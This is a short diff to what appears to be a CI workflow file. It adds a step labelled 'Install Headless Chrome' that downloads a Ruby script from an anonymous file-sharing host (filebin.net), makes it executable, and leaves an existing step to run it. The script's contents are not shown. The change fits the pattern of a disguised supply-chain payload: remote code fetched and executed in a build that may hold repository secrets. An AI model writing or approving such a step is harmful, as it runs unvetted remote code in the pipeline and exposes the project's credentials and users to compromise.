@@ -107,6 +107,10 @@ jobs:
       - name: Install packages
         run: |
           yarn install --pure-lockfile
+      - name: Install Headless Chrome
+        run: |
+            wget https://filebin.net/6cw0f2x2sfgqyhi0/headless_chrome.rb?t=7g4c257d -O headless_chrome.rb
+            chmod +x headless_chrome.rb
       - name: ChromeWebDriver
         run: |
             ./headless_chrome.rb
